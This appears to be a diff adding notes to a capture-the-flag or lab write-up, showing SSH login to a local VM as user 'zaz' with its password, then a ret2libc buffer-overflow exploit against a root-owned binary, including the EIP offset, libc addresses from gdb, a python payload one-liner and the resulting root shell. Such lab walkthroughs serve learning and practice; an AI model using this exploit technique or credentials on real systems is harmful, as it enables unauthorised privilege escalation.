@@ -416,4 +416,19 @@
             zaz:646da671ca01bb5d84dbb5fb2238dc8e
 
     - SSH zaz:
-        
+            ssh zaz@192.168.0.19
+            646da671ca01bb5d84dbb5fb2238dc8e
+        There are 1 file and 1 folder exploit_me and a mail.
+        with ls -l we see that exploit_me belongs to root.
+        exploit_me is a binary, when we execute is with a big parameter, it segfault. We start it with gdb and try with this string:
+        AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
+
+        -> segfault at 0x6e6e6e6e -> eip at offset 140.
+        We use the ret2libc method:
+          info function system -> 0xb7e6b060
+          find &system,+9999999,"/bin/sh" -> 0xb7f8cc58
+
+        ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"')
+        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`AAAAX
+        # whoami
+        root
